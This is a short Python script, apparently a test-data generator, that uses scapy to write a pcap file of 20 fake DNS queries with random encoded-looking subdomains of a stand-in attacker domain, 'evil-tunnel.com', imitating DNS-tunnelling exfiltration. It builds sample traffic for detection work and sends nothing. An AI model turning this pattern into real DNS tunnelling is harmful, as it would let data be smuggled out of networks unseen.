import random
import string
from scapy.all import Ether, IP, UDP, DNS, DNSQR, wrpcap

packets = []
for i in range(20):
    # random 30-character subdomain, like encoded data
    sub = "".join(random.choices(string.ascii_lowercase + string.digits, k=30))
    pkt = (
        Ether()
        / IP(src="192.168.56.10", dst="8.8.8.8")
        / UDP(sport=50000 + i, dport=53)
        / DNS(rd=1, qd=DNSQR(qname=f"{sub}.evil-tunnel.com"))
    )
    pkt.time = 1700000000 + i
    packets.append(pkt)

wrpcap("data/dns_tunnel.pcap", packets)
print("Wrote data/dns_tunnel.pcap with", len(packets), "packets")